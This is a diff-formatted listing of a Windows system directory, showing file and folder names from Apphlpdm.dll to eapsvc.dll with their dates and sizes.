+07/13/2009  06:40 PM            33,792 Apphlpdm.dll
+02/02/2015  08:30 PM            58,880 appidapi.dll
+02/02/2015  08:30 PM            17,920 appidcertstorecheck.exe
+02/02/2015  08:30 PM           146,944 appidpolicyconverter.exe
+07/13/2009  06:40 PM           312,320 AppIdPolicyEngineApi.dll
+02/02/2015  08:30 PM            32,256 appidsvc.dll
+11/20/2010  08:24 PM            70,656 appinfo.dll
+07/13/2009  06:40 PM           193,536 appmgmts.dll
+11/20/2010  08:24 PM           479,232 appmgr.dll
+11/20/2010  08:24 PM           726,528 appwiz.cpl
+07/13/2009  06:40 PM           243,200 apss.dll
+07/13/2009  08:20 PM    <DIR>          ar-SA
+07/13/2009  06:38 PM            24,064 ARP.EXE
+04/11/2014  10:39 PM            29,888 aspnet_counters.dll
+07/13/2009  06:40 PM            27,648 aspperf.dll
+11/20/2010  08:24 PM            84,992 asycfilt.dll
+07/13/2009  06:38 PM            28,672 at.exe
+07/13/2009  06:38 PM            35,328 AtBroker.exe
+07/13/2009  06:40 PM            90,624 atl.dll
+11/20/2010  08:24 PM           367,104 atmfd.dll
+11/20/2010  08:24 PM            46,080 atmlib.dll
+07/13/2009  06:38 PM            18,432 attrib.exe
+02/02/2015  08:30 PM           126,464 audiodg.exe
+02/02/2015  08:30 PM           440,832 AudioEng.dll
+02/02/2015  08:31 PM           500,224 AUDIOKSE.dll
+02/02/2015  08:30 PM           296,448 AudioSes.dll
+02/02/2015  08:30 PM           680,960 audiosrv.dll
+07/13/2009  06:40 PM           194,048 auditcse.dll
+07/13/2009  06:40 PM           220,672 AuditNativeSnapIn.dll
+02/02/2015  08:30 PM            64,000 auditpol.exe
+07/13/2009  06:40 PM            75,264 AuditPolicyGPInterop.dll
+07/13/2009  06:25 PM            95,232 auditpolmsg.dll
+07/13/2009  06:40 PM           491,520 authfwcfg.dll
+07/13/2009  06:40 PM           304,128 AuthFWGP.dll
+11/20/2010  08:24 PM         5,066,752 AuthFWSnapin.dll
+07/13/2009  06:54 PM           126,976 AuthFWWizFwk.dll
+06/10/2009  02:00 PM            15,032 authserv.mib
+11/20/2010  08:24 PM         1,927,680 authui.dll
+07/13/2009  06:40 PM           177,664 authz.dll
+11/20/2010  08:24 PM           777,728 autochk.exe
+11/20/2010  08:24 PM           793,088 autoconv.exe
+11/20/2010  08:24 PM           763,904 autofmt.exe
+11/20/2010  08:24 PM           155,136 autoplay.dll
+07/13/2009  06:40 PM           164,352 AuxiliaryDisplayApi.dll
+07/13/2009  06:40 PM           136,192 AuxiliaryDisplayClassInstaller.dll
+07/13/2009  06:40 PM            76,800 avicap32.dll
+07/13/2009  06:40 PM           108,544 avifil32.dll
+07/13/2009  06:41 PM            44,544 avolprop.dll
+07/13/2009  06:40 PM            18,432 avrt.dll
+06/10/2009  01:38 PM            41,587 azman.msc
+11/20/2010  08:24 PM           897,536 azroles.dll
+11/20/2010  08:24 PM           472,064 azroleui.dll
+11/20/2010  08:24 PM            31,744 AzSqlExt.dll
+11/20/2010  08:24 PM           166,784 basecsp.dll
+07/13/2009  06:40 PM            52,736 basesrv.dll
+11/20/2010  08:24 PM           749,568 batmeter.dll
+07/13/2009  06:40 PM           103,424 batt.dll
+11/20/2010  08:24 PM           175,616 bcdboot.exe
+11/20/2010  08:24 PM           346,112 bcdedit.exe
+07/13/2009  06:40 PM            77,824 bcdprov.dll
+11/20/2010  08:24 PM           168,448 bcdsrv.dll
+07/13/2009  06:40 PM           123,904 bcrypt.dll
+11/20/2010  08:24 PM           298,104 bcryptprimitives.dll
+07/13/2009  10:37 PM    <DIR>          BestPractices
+11/20/2010  08:24 PM           705,024 BFE.DLL
+07/13/2009  08:20 PM    <DIR>          bg-BG
+07/13/2009  06:40 PM            43,008 bidispl.dll
+11/20/2010  08:24 PM           232,448 bitsadmin.exe
+07/13/2009  06:40 PM            56,832 bitsigd.dll
+11/20/2010  08:24 PM            24,576 bitsperf.dll
+07/13/2009  06:40 PM            12,800 bitsprx2.dll
+07/13/2009  06:40 PM            13,312 bitsprx3.dll
+07/13/2009  06:40 PM            12,288 bitsprx4.dll
+07/13/2009  06:40 PM            33,280 bitsprx5.dll
+07/13/2009  06:40 PM            13,312 bitsprx6.dll
+07/13/2009  06:25 PM             2,048 blbres.dll
+07/13/2009  06:25 PM           308,224 blbuires.dll
+07/13/2009  06:40 PM            28,672 blb_ps.dll
+03/19/2023  02:16 AM    <DIR>          Boot
+06/10/2009  02:06 PM         3,170,304 boot.sdi
+07/13/2009  06:38 PM            94,720 bootcfg.exe
+07/13/2009  06:25 PM             2,560 bootstr.dll
+07/13/2009  06:52 PM            23,120 BOOTVID.DLL
+07/13/2009  06:40 PM            19,456 brcoinst.dll
+07/13/2009  06:40 PM            27,648 brdgcfg.dll
+07/13/2009  06:25 PM             2,048 bridgeres.dll
+07/13/2009  06:38 PM            20,992 bridgeunattend.exe
+11/20/2010  08:24 PM            58,880 browcli.dll
+11/20/2010  08:24 PM           136,192 browser.dll
+11/20/2010  08:24 PM            14,336 browseui.dll
+07/13/2009  06:40 PM            42,496 bthci.dll
+07/13/2009  06:40 PM            30,720 BthMtpContextHandler.dll
+07/13/2009  06:40 PM            83,968 bthserv.dll
+07/13/2009  06:40 PM            69,120 BWContextHandler.dll
+11/20/2010  08:24 PM            14,848 BWUnpairElevated.dll
+11/20/2010  08:24 PM            94,720 cabinet.dll
+11/20/2010  08:24 PM           139,264 cabview.dll
+07/13/2009  06:38 PM            31,232 cacls.exe
+07/13/2009  06:38 PM           918,528 calc.exe
+10/02/2016  11:56 PM             4,119 CallUxxProvider.vbs
+07/13/2009  06:40 PM            53,760 capiprovider.dll
+07/13/2009  06:40 PM            25,088 capisp.dll
+03/19/2023  02:45 AM    <DIR>          catroot
+08/12/2026  09:23 AM    <DIR>          catroot2
+07/13/2009  06:40 PM           472,576 catsrv.dll
+07/13/2009  06:40 PM            56,320 catsrvps.dll
+07/13/2009  06:40 PM           525,824 catsrvut.dll
+11/20/2010  08:24 PM           144,384 cdd.dll
+11/20/2010  08:24 PM         1,133,568 cdosys.dll
+11/20/2010  08:24 PM           252,416 ceipdata.exe
+11/20/2010  08:24 PM           140,800 ceiprole.dll
+11/20/2010  08:24 PM            39,424 ceiprole.exe
+11/20/2010  08:24 PM           419,328 certadm.dll
+11/20/2010  08:24 PM           460,800 certcli.dll
+07/13/2009  06:40 PM           129,024 certCredProvider.dll
+07/13/2009  06:40 PM            52,224 certenc.dll
+11/20/2010  08:24 PM         1,975,296 CertEnroll.dll
+07/13/2009  06:38 PM            70,144 CertEnrollCtrl.exe
+07/13/2009  06:40 PM           297,984 CertEnrollUI.dll
+11/20/2010  08:24 PM         1,796,096 certmgr.dll
+06/10/2009  01:56 PM            63,070 certmgr.msc
+07/13/2009  06:40 PM           793,088 certocm.dll
+07/13/2009  06:40 PM            24,064 certpick.dll
+11/20/2010  08:24 PM            71,680 CertPolEng.dll
+11/20/2010  08:24 PM            80,384 certprop.dll
+07/13/2009  06:38 PM           326,144 certreq.exe
+07/13/2009  06:38 PM         1,175,552 certutil.exe
+07/13/2009  06:40 PM            57,344 cfgbkend.dll
+11/20/2010  08:24 PM           207,872 cfgmgr32.dll
+07/13/2009  06:28 PM           175,104 chajei.ime
+11/20/2010  08:24 PM            16,896 change.exe
+07/13/2009  04:25 PM            12,800 chcp.com
+11/20/2010  08:24 PM            22,528 chglogon.exe
+11/20/2010  08:24 PM            24,064 chgport.exe
+11/20/2010  08:24 PM            21,504 chgusr.exe
+07/13/2009  06:38 PM            36,864 chkdsk.exe
+07/13/2009  06:38 PM            18,944 chkntfs.exe
+07/13/2009  06:40 PM            22,528 chkwudrv.dll
+11/20/2010  08:24 PM            36,864 choice.exe
+07/13/2009  06:41 PM         1,675,776 chsbrkr.dll
+07/13/2009  06:41 PM         6,100,480 chtbrkr.dll
+07/13/2009  06:40 PM            12,800 CHxReadingStringIME.dll
+06/27/2014  05:21 PM           457,400 ci.dll
+07/13/2009  06:40 PM           211,968 cic.dll
+07/13/2009  06:28 PM           175,104 cintlgnt.ime
+07/13/2009  06:38 PM            43,008 cipher.exe
+07/13/2009  06:40 PM            17,408 clb.dll
+07/13/2009  06:40 PM           607,744 clbcatq.dll
+07/13/2009  06:52 PM           367,696 clfs.sys
+07/13/2009  06:40 PM            79,360 clfsw32.dll
+07/13/2009  06:40 PM           102,400 cliconfg.dll
+07/13/2009  06:38 PM            49,152 cliconfg.exe
+07/13/2009  05:28 PM            40,960 cliconfg.rll
+07/13/2009  06:38 PM            32,256 clip.exe
+11/20/2010  08:24 PM           314,368 clusapi.dll
+07/13/2009  06:40 PM            37,376 cmcfg32.dll
+11/20/2010  08:24 PM           345,088 cmd.exe
+07/13/2009  06:40 PM           525,312 cmdial32.dll
+07/13/2009  06:39 PM            16,384 cmdkey.exe
+07/13/2009  06:39 PM            80,384 cmdl32.exe
+07/13/2009  06:40 PM            82,944 cmicryptinstall.dll
+07/13/2009  06:40 PM            80,384 cmifw.dll
+07/13/2009  06:40 PM           472,064 cmipnpinstall.dll
+07/13/2009  06:40 PM            41,984 cmlua.dll
+07/13/2009  06:39 PM            45,056 cmmon32.exe
+07/13/2009  06:40 PM            28,672 cmpbk32.dll
+11/20/2010  08:24 PM            92,160 cmstp.exe
+07/13/2009  06:40 PM            18,432 cmstplua.dll
+07/13/2009  06:40 PM            58,880 cmutil.dll
+07/13/2009  06:40 PM            18,944 cngaudit.dll
+07/13/2009  06:40 PM            57,344 cngprovider.dll
+07/13/2009  06:40 PM            38,400 cnvfat.dll
+03/19/2023  02:39 AM    <DIR>          CodeIntegrity
+07/13/2009  06:39 PM            22,528 cofire.exe
+07/13/2009  06:40 PM            32,256 cofiredm.dll
+07/13/2009  06:40 PM            80,384 colbact.dll
+07/13/2009  06:39 PM            86,528 colorcpl.exe
+07/13/2009  06:40 PM           624,640 colorui.dll
+11/20/2010  10:56 PM    <DIR>          com
+07/13/2009  06:40 PM             8,704 comcat.dll
+11/20/2010  08:24 PM           633,856 comctl32.dll
+11/20/2010  08:24 PM           594,432 comdlg32.dll
+06/10/2009  01:34 PM           124,118 comexp.msc
+07/13/2009  06:39 PM            24,064 comp.exe
+07/13/2009  06:39 PM            19,968 compact.exe
+11/20/2010  08:24 PM           210,944 ComplianceExtensions.dll
+06/10/2009  01:38 PM           113,256 compmgmt.msc
+07/13/2009  06:39 PM           145,920 CompMgmtLauncher.exe
+07/13/2009  06:40 PM           302,080 compstui.dll
+07/13/2009  06:39 PM            37,376 ComputerDefaults.exe
+07/13/2009  06:40 PM           147,456 comrepl.dll
+07/13/2009  06:26 PM         1,297,408 comres.dll
+07/13/2009  06:40 PM           303,616 comsnap.dll
+07/13/2009  06:40 PM         1,735,680 comsvcs.dll
+07/13/2009  06:40 PM           897,024 comuid.dll
+03/19/2023  02:20 AM    <DIR>          config
+03/19/2023  02:17 AM    <DIR>          Configuration
+06/10/2009  01:49 PM             9,054 Configure-SMRemoting.ps1
+11/20/2010  08:24 PM           337,920 conhost.exe
+07/13/2009  06:40 PM         1,393,152 connect.dll
+11/20/2010  08:24 PM           112,000 consent.exe
+07/13/2009  06:40 PM            80,896 console.dll
+07/13/2009  06:39 PM           114,688 control.exe
+07/13/2009  06:39 PM            20,480 convert.exe
+07/13/2009  06:40 PM            22,016 corpol.dll
+07/13/2009  06:40 PM            87,040 correngine.dll
+02/02/2015  08:30 PM            22,016 credssp.dll
+11/20/2010  08:24 PM           197,120 credui.dll
+07/13/2009  06:39 PM            34,304 credwiz.exe
+02/02/2015  08:30 PM         1,480,192 crypt32.dll
+07/13/2009  06:40 PM            44,032 cryptbase.dll
+07/13/2009  06:40 PM            30,720 cryptdlg.dll
+07/13/2009  06:40 PM            66,048 cryptdll.dll
+07/13/2009  06:40 PM            66,560 cryptext.dll
+02/02/2015  08:30 PM           140,288 cryptnet.dll
+02/02/2015  08:30 PM            82,432 cryptsp.dll
+02/02/2015  08:30 PM           187,904 cryptsvc.dll
+02/02/2015  08:30 PM         1,069,056 cryptui.dll
+07/13/2009  06:40 PM           130,560 cryptxml.dll
+11/20/2010  08:32 PM    <DIR>          cs-CZ
+11/20/2010  08:24 PM            46,080 cscapi.dll
+11/20/2010  08:24 PM            30,208 cscdll.dll
+07/13/2009  06:39 PM           156,160 cscript.exe
+02/02/2015  08:30 PM            43,520 csrsrv.dll
+07/13/2009  06:39 PM             7,680 csrss.exe
+07/13/2009  06:39 PM             9,728 ctfmon.exe
+07/13/2009  06:39 PM           322,048 cttune.exe
+07/13/2009  06:39 PM            40,448 cttunesvr.exe
+06/10/2009  02:10 PM            66,082 C_037.NLS
+06/10/2009  02:10 PM            66,082 C_10000.NLS
+06/10/2009  02:10 PM           162,850 C_10001.NLS
+06/10/2009  02:10 PM           195,618 C_10002.NLS
+06/10/2009  02:10 PM           177,698 C_10003.NLS
+06/10/2009  02:10 PM            66,082 C_10004.NLS
+06/10/2009  02:10 PM            66,082 C_10005.NLS
+06/10/2009  02:10 PM            66,082 C_10006.NLS
+06/10/2009  02:10 PM            66,082 C_10007.NLS
+06/10/2009  02:10 PM           173,602 C_10008.NLS
+06/10/2009  02:10 PM            66,082 C_10010.NLS
+06/10/2009  02:10 PM            66,082 C_10017.NLS
+06/10/2009  02:10 PM            66,082 C_10021.NLS
+06/10/2009  02:10 PM            66,082 C_10029.NLS
+06/10/2009  02:10 PM            66,082 C_10079.NLS
+06/10/2009  02:10 PM            66,082 C_10081.NLS
+06/10/2009  02:10 PM            66,082 C_10082.NLS
+06/10/2009  02:10 PM            66,082 C_1026.NLS
+06/10/2009  02:10 PM            66,082 C_1047.NLS
+06/10/2009  02:10 PM            66,082 C_1140.NLS
+06/10/2009  02:10 PM            66,082 C_1141.NLS
+06/10/2009  02:10 PM            66,082 C_1142.NLS
+06/10/2009  02:10 PM            66,082 C_1143.NLS
+06/10/2009  02:10 PM            66,082 C_1144.NLS
+06/10/2009  02:10 PM            66,082 C_1145.NLS
+06/10/2009  02:10 PM            66,082 C_1146.NLS
+06/10/2009  02:10 PM            66,082 C_1147.NLS
+06/10/2009  02:10 PM            66,082 C_1148.NLS
+06/10/2009  02:10 PM            66,082 C_1149.NLS
+06/10/2009  02:10 PM            66,082 C_1250.NLS
+06/10/2009  02:10 PM            66,082 C_1251.NLS
+06/10/2009  02:10 PM            66,082 C_1252.NLS
+06/10/2009  02:10 PM            66,082 C_1253.NLS
+06/10/2009  02:10 PM            66,082 C_1254.NLS
+06/10/2009  02:10 PM            66,082 C_1255.NLS
+06/10/2009  02:10 PM            66,082 C_1256.NLS
+06/10/2009  02:10 PM            66,082 C_1257.NLS
+06/10/2009  02:10 PM            66,082 C_1258.NLS
+06/10/2009  02:10 PM           189,986 C_1361.NLS
+06/10/2009  02:10 PM           180,258 C_20000.NLS
+06/10/2009  02:10 PM           186,402 C_20001.NLS
+06/10/2009  02:10 PM           173,602 C_20002.NLS
+06/10/2009  02:10 PM           185,378 C_20003.NLS
+06/10/2009  02:10 PM           180,258 C_20004.NLS
+06/10/2009  02:10 PM           187,938 C_20005.NLS
+06/10/2009  02:10 PM            66,082 C_20105.NLS
+06/10/2009  02:10 PM            66,082 C_20106.NLS
+06/10/2009  02:10 PM            66,082 C_20107.NLS
+06/10/2009  02:10 PM            66,082 C_20108.NLS
+06/10/2009  02:10 PM            66,082 C_20127.NLS
+06/10/2009  02:10 PM           139,810 C_20261.NLS
+06/10/2009  02:10 PM            66,082 C_20269.NLS
+06/10/2009  02:10 PM            66,082 C_20273.NLS
+06/10/2009  02:10 PM            66,082 C_20277.NLS
+06/10/2009  02:10 PM            66,082 C_20278.NLS
+06/10/2009  02:10 PM            66,082 C_20280.NLS
+06/10/2009  02:10 PM            66,082 C_20284.NLS
+06/10/2009  02:10 PM            66,082 C_20285.NLS
+06/10/2009  02:10 PM            66,082 C_20290.NLS
+06/10/2009  02:10 PM            66,082 C_20297.NLS
+06/10/2009  02:10 PM            66,082 C_20420.NLS
+06/10/2009  02:10 PM            66,082 C_20423.NLS
+06/10/2009  02:10 PM            66,082 C_20424.NLS
+06/10/2009  02:10 PM            66,082 C_20833.NLS
+06/10/2009  02:10 PM            66,082 C_20838.NLS
+06/10/2009  02:10 PM            66,082 C_20866.NLS
+06/10/2009  02:10 PM            66,082 C_20871.NLS
+06/10/2009  02:10 PM            66,082 C_20880.NLS
+06/10/2009  02:10 PM            66,082 C_20905.NLS
+06/10/2009  02:10 PM            66,082 C_20924.NLS
+06/10/2009  02:10 PM           180,770 C_20932.NLS
+06/10/2009  02:10 PM           173,602 C_20936.NLS
+06/10/2009  02:10 PM           177,698 C_20949.NLS
+06/10/2009  02:10 PM            66,082 C_21025.NLS
+06/10/2009  02:10 PM            66,082 C_21027.NLS
+06/10/2009  02:10 PM            66,082 C_21866.NLS
+06/10/2009  02:10 PM            66,082 C_28591.NLS
+06/10/2009  02:10 PM            66,082 C_28592.NLS
+06/10/2009  02:10 PM            66,082 C_28593.NLS
+06/10/2009  02:10 PM            66,082 C_28594.NLS
+06/10/2009  02:10 PM            66,082 C_28595.NLS
+06/10/2009  02:10 PM            66,082 C_28596.NLS
+06/10/2009  02:10 PM            66,082 C_28597.NLS
+06/10/2009  02:10 PM            66,082 C_28598.NLS
+06/10/2009  02:10 PM            66,082 C_28599.NLS
+06/10/2009  02:10 PM            66,082 c_28603.nls
+06/10/2009  02:10 PM            66,082 C_28605.NLS
+06/10/2009  02:10 PM            66,594 C_437.NLS
+06/10/2009  02:10 PM            66,082 C_500.NLS
+06/10/2009  02:10 PM            66,082 C_708.NLS
+06/10/2009  02:10 PM            66,594 C_720.NLS
+06/10/2009  02:10 PM            66,594 C_737.NLS
+06/10/2009  02:10 PM            66,594 C_775.NLS
+06/10/2009  02:10 PM            66,594 C_850.NLS
+06/10/2009  02:10 PM            66,594 C_852.NLS
+06/10/2009  02:10 PM            66,594 C_855.NLS
+06/10/2009  02:10 PM            66,594 C_857.NLS
+06/10/2009  02:10 PM            66,594 C_858.NLS
+06/10/2009  02:10 PM            66,594 C_860.NLS
+06/10/2009  02:10 PM            66,594 C_861.NLS
+06/10/2009  02:10 PM            66,594 C_862.NLS
+06/10/2009  02:10 PM            66,594 C_863.NLS
+06/10/2009  02:10 PM            66,594 C_864.NLS
+06/10/2009  02:10 PM            66,594 C_865.NLS
+06/10/2009  02:10 PM            66,594 C_866.NLS
+06/10/2009  02:10 PM            66,594 C_869.NLS
+06/10/2009  02:10 PM            66,082 C_870.NLS
+06/10/2009  02:10 PM            66,594 C_874.NLS
+06/10/2009  02:10 PM            66,082 C_875.NLS
+06/10/2009  02:10 PM           162,850 C_932.NLS
+06/10/2009  02:10 PM           196,642 C_936.NLS
+06/10/2009  02:10 PM           196,642 C_949.NLS
+06/10/2009  02:10 PM           196,642 C_950.NLS
+07/13/2009  0
+
+6:40 PM           223,744 C_G18030.DLL
+07/13/2009  06:40 PM            12,800 C_IS2022.DLL
+11/20/2010  08:24 PM            13,312 C_ISCII.DLL
+11/20/2010  08:24 PM           902,144 d2d1.dll
+07/13/2009  06:40 PM         1,267,712 d3d10.dll
+07/13/2009  06:40 PM           280,576 d3d10core.dll
+11/20/2010  08:24 PM           573,952 d3d10level9.dll
+11/20/2010  08:24 PM         1,838,080 d3d10warp.dll
+07/13/2009  06:40 PM           197,120 d3d10_1.dll
+11/20/2010  08:24 PM           321,024 d3d10_1core.dll
+11/20/2010  08:24 PM           787,968 d3d11.dll
+07/13/2009  06:40 PM            12,288 d3d8thk.dll
+11/20/2010  08:24 PM         2,067,456 d3d9.dll
+11/20/2010  08:32 PM    <DIR>          da-DK
+07/13/2009  06:40 PM            25,600 davhlpr.dll
+11/20/2010  08:24 PM         3,391,488 dbgeng.dll
+11/20/2010  08:24 PM         1,087,488 dbghelp.dll
+07/13/2009  06:40 PM           147,456 dbnetlib.dll
+07/13/2009  06:40 PM            40,960 dbnmpntw.dll
+07/13/2009  06:39 PM            41,472 dcgpofix.exe
+07/13/2009  06:40 PM            14,336 dciman32.dll
+07/13/2009  06:39 PM            10,240 dcomcnfg.exe
+07/13/2009  06:39 PM           183,808 dcpromo.exe
+07/13/2009  06:39 PM            43,008 ddodiag.exe
+07/13/2009  06:40 PM            27,136 DDOIProxy.dll
+07/13/2009  06:40 PM         6,281,216 DDORes.dll
+07/13/2009  06:40 PM           569,344 ddraw.dll
+07/13/2009  06:40 PM            40,448 ddrawex.dll
+07/13/2009  08:20 PM    <DIR>          de-DE
+07/13/2009  06:39 PM           183,296 Defrag.exe
+07/13/2009  06:40 PM            16,384 defragproxy.dll
+07/13/2009  06:40 PM           291,328 defragsvc.dll
+11/20/2010  08:24 PM           130,048 desk.cpl
+07/13/2009  06:40 PM            49,664 deskadp.dll
+07/13/2009  06:40 PM            48,128 deskmon.dll
+07/13/2009  06:40 PM            41,472 deskperf.dll
+07/13/2009  06:40 PM            75,776 devenum.dll
+11/20/2010  08:24 PM           508,928 DeviceCenter.dll
+07/13/2009  06:39 PM           111,616 DeviceDisplayObjectProvider.exe
+07/13/2009  06:40 PM            20,480 DeviceDisplayStatusManager.dll
+07/13/2009  06:39 PM            25,600 DeviceEject.exe
+07/13/2009  06:40 PM            28,672 DeviceMetadataParsers.dll
+07/13/2009  06:40 PM           189,952 DevicePairing.dll
+11/20/2010  08:24 PM           225,280 DevicePairingFolder.dll
+07/13/2009  06:40 PM            87,552 DevicePairingHandler.dll
+07/13/2009  06:40 PM            58,368 DevicePairingProxy.dll
+07/13/2009  06:39 PM            74,752 DevicePairingWizard.exe
+07/13/2009  06:39 PM            92,672 DeviceProperties.exe
+07/13/2009  06:40 PM            10,240 DeviceUxRes.dll
+06/10/2009  02:07 PM           145,640 devmgmt.msc
+07/13/2009  06:40 PM           528,896 devmgr.dll
+07/13/2009  06:40 PM            93,184 devobj.dll
+07/13/2009  06:40 PM            58,368 devrtl.dll
+11/20/2010  08:24 PM           606,208 dfrgui.exe
+07/13/2009  06:40 PM            62,976 dfscli.dll
+07/13/2009  06:39 PM            31,232 dfsfrsHost.exe
+11/20/2010  08:24 PM         1,942,856 dfshim.dll
+07/13/2009  06:26 PM            82,432 DfsRes.dll
+06/10/2009  01:58 PM           268,640 dfsrHealthReport.xsl
+07/13/2009  06:40 PM           672,256 DfsrHelper.dll
+06/10/2009  01:58 PM           155,741 dfsrPropagationReport.xsl
+07/13/2009  06:40 PM            68,096 DfsShlEx.dll
+06/10/2009  02:00 PM             4,597 dhcp.mib
+07/13/2009  06:40 PM            13,824 dhcpcmonitor.dll
+11/20/2010  08:24 PM           317,952 dhcpcore.dll
+07/13/2009  06:40 PM           224,256 dhcpcore6.dll
+07/13/2009  06:40 PM            87,040 dhcpcsvc.dll
+07/13/2009  06:40 PM            54,272 dhcpcsvc6.dll
+07/13/2009  06:40 PM           101,888 DHCPQEC.DLL
+07/13/2009  06:40 PM           114,688 dhcpsapi.dll
+11/20/2010  08:24 PM         1,202,176 DiagCpl.dll
+07/13/2009  06:39 PM            35,328 dialer.exe
+07/13/2009  06:39 PM           116,224 diantz.exe
+07/13/2009  06:40 PM           504,320 difxapi.dll
+07/13/2009  06:40 PM            40,448 dimsjob.dll
+07/13/2009  06:40 PM            44,544 dimsroam.dll
+07/13/2009  06:39 PM             8,704 dinotify.exe
+07/13/2009  06:40 PM           173,056 dinput.dll
+07/13/2009  06:40 PM           195,584 dinput8.dll
+07/13/2009  04:25 PM            15,360 diskcomp.com
+07/13/2009  04:25 PM            12,800 diskcopy.com
+07/13/2009  06:40 PM         1,502,208 diskcopy.dll
+06/10/2009  02:08 PM            47,679 diskmgmt.msc
+11/20/2010  08:24 PM           166,400 diskpart.exe
+07/13/2009  06:39 PM            19,456 diskperf.exe
+11/20/2010  08:24 PM           363,520 diskraid.exe
+11/20/2010  08:25 PM           584,704 diskshadow.exe
+03/19/2023  02:16 AM    <DIR>          Dism
+07/13/2009  06:39 PM           274,944 Dism.exe
+07/13/2009  06:40 PM            47,616 dispci.dll
+07/13/2009  06:39 PM           159,232 dispdiag.exe
+07/13/2009  06:40 PM            18,944 dispex.dll
+11/20/2010  08:24 PM         1,066,496 Display.dll
+07/13/2009  06:39 PM           529,408 DisplaySwitch.exe
+11/20/2010  08:24 PM            61,440 djoin.exe
+07/13/2009  06:39 PM             9,728 dllhost.exe
+07/13/2009  06:39 PM             8,192 dllhst3g.exe
+07/13/2009  06:40 PM           487,424 dmdlgs.dll
+07/13/2009  06:40 PM           282,112 dmdskmgr.dll
+07/13/2009  06:26 PM           372,224 dmdskres.dll
+07/13/2009  06:26 PM             2,048 dmdskres2.dll
+07/13/2009  06:40 PM            60,928 dmintf.dll
+07/13/2009  06:40 PM            49,664 dmocx.dll
+07/13/2009  06:40 PM           135,168 dmrc.dll
+07/13/2009  06:40 PM            24,064 dmutil.dll
+07/13/2009  06:40 PM           221,184 dmvdsitf.dll
+07/13/2009  06:38 PM           147,456 dmview.ocx
+11/20/2010  08:24 PM            33,280 dmvscres.dll
+11/20/2010  08:24 PM           357,888 dnsapi.dll
+07/13/2009  06:39 PM            30,208 dnscacheugc.exe
+11/20/2010  08:24 PM           118,272 dnscmmc.dll
+07/13/2009  06:40 PM             8,192 dnsext.dll
+07/13/2009  06:40 PM           104,960 dnshc.dll
+11/20/2010  08:24 PM           183,296 dnsrslvr.dll
+07/13/2009  06:40 PM            43,520 docprop.dll
+07/13/2009  06:26 PM            51,200 DocumentPerformanceEvents.dll
+07/13/2009  06:39 PM            18,944 doskey.exe
+11/20/2010  08:24 PM            84,992 dot3api.dll
+11/20/2010  08:24 PM            69,120 dot3cfg.dll
+07/13/2009  06:40 PM            57,856 dot3dlg.dll
+07/13/2009  06:40 PM            56,832 dot3gpclnt.dll
+07/13/2009  06:40 PM           280,064 dot3gpui.dll
+07/13/2009  06:40 PM            69,632 dot3hc.dll
+11/20/2010  08:24 PM           103,936 dot3msm.dll
+11/20/2010  08:24 PM           252,416 dot3svc.dll
+11/20/2010  08:24 PM           313,344 dot3ui.dll
+07/13/2009  06:39 PM            74,752 dpapimig.exe
+07/13/2009  06:40 PM            52,736 dpapiprovider.dll
+07/13/2009  06:39 PM            77,312 DpiScaling.exe
+11/20/2010  08:24 PM             3,072 dpnaddr.dll
+07/13/2009  06:40 PM            68,608 dpnathlp.dll
+07/13/2009  06:40 PM           478,208 dpnet.dll
+07/13/2009  06:40 PM             8,704 dpnhpast.dll
+07/13/2009  06:40 PM             8,704 dpnhupnp.dll
+07/13/2009  06:26 PM             3,072 dpnlobby.dll
+07/13/2009  06:39 PM            34,304 dpnsvr.exe
+11/20/2010  08:24 PM           162,816 dps.dll
+11/20/2010  08:24 PM           399,872 dpx.dll
+07/13/2009  06:39 PM            96,256 driverquery.exe
+03/19/2023  02:45 AM    <DIR>          drivers
+03/19/2023  02:45 AM    <DIR>          DriverStore
+07/13/2009  06:40 PM            24,576 drprov.dll
+07/13/2009  06:39 PM           102,912 drvinst.exe
+11/20/2010  08:24 PM           422,912 drvstore.dll
+07/13/2009  06:40 PM            28,672 ds32gt.dll
+11/20/2010  08:24 PM            36,864 dsauth.dll
+03/19/2023  02:17 AM    <DIR>          dsc
+12/08/2016  07:35 PM           470,528 DscCore.dll
+12/08/2016  07:38 PM           202,752 DscCoreConfProv.dll
+12/08/2016  07:33 PM            19,456 DscProxy.dll
+12/08/2016  07:36 PM            25,088 DscTimer.dll
+07/13/2009  06:40 PM           193,536 dsdmo.dll
+07/13/2009  06:40 PM           115,200 dskquota.dll
+11/20/2010  08:24 PM           239,616 dskquoui.dll
+07/13/2009  06:40 PM           540,672 dsound.dll
+07/13/2009  06:40 PM           190,976 dsprop.dll
+07/13/2009  06:40 PM           429,056 dsquery.dll
+07/13/2009  06:40 PM            32,768 dsrole.dll
+06/10/2009  01:53 PM           215,943 dssec.dat
+07/13/2009  06:40 PM            55,808 dssec.dll
+07/13/2009  06:43 PM           190,880 dssenh.dll
+11/20/2010  08:24 PM           701,440 dsuiext.dll
+07/13/2009  06:40 PM            36,352 dtsh.dll
+07/13/2009  06:40 PM           976,896 dui70.dll
+07/13/2009  06:40 PM           260,608 duser.dll
+07/13/2009  06:39 PM            11,264 dvdplay.exe
+07/13/2009  06:39 PM            26,112 dvdupgrd.exe
+07/13/2009  06:39 PM           120,320 dwm.exe
+07/13/2009  06:40 PM            82,432 dwmapi.dll
+11/20/2010  08:24 PM         1,632,256 dwmcore.dll
+11/20/2010  08:24 PM           128,512 dwmredir.dll
+11/20/2010  08:24 PM         1,544,192 DWrite.dll
+07/13/2009  06:39 PM           152,576 DWWIN.EXE
+07/13/2009  06:39 PM           343,552 dxdiag.exe
+11/20/2010  08:24 PM           279,552 dxdiagn.dll
+11/20/2010  08:24 PM           658,944 dxgi.dll
+11/20/2010  08:24 PM           459,776 DXP.dll
+07/13/2009  06:40 PM            40,448 dxpps.dll
+07/13/2009  06:39 PM           265,216 Dxpserver.exe
+11/20/2010  08:24 PM         1,457,664 DxpTaskSync.dll
+07/13/2009  06:40 PM           497,152 dxtmsft.dll
+07/13/2009  06:40 PM           315,904 dxtrans.dll
+07/13/2009  06:40 PM           117,248 dxva2.dll
+07/13/2009  06:39 PM            11,776 Eap3Host.exe
+11/20/2010  08:24 PM           235,008 eapa3hst.dll
+11/20/2010  08:24 PM           133,120 eapacfg.dll
+11/20/2010  08:24 PM           232,448 eapahost.dll
+11/20/2010  08:24 PM           348,160 eapp3hst.dll
+07/13/2009  06:40 PM           263,680 eappcfg.dll
+11/20/2010  08:24 PM           103,936 eappgnui.dll
+11/20/2010  08:24 PM           303,616 eapphost.dll
+07/13/2009  06:40 PM            64,512 eappprxy.dll
+07/13/2009  06:40 PM            91,648 EAPQEC.DLL
+07/13/2009  06:40 PM           111,104 eapsvc.dll
